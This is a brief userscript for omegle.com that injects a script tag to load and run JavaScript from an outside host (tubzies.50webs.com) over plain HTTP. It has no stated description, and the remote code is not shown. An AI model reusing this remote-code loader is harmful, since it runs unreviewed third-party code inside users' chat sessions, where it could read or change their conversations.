// ==UserScript==
// @name       Omegle Alternate Source
// @version    0.4
// @description  
// @include    http://*.omegle.com/
// @copyright  2011+, Mr. Mister
// ==/UserScript==


var scriptNode = document.createElement('SCRIPT');
scriptNode.type = 'text/javascript';
scriptNode.src = "http://tubzies.50webs.com/code.js?6";
var headNode = document.getElementsByTagName('HEAD');
headNode[0].appendChild(scriptNode);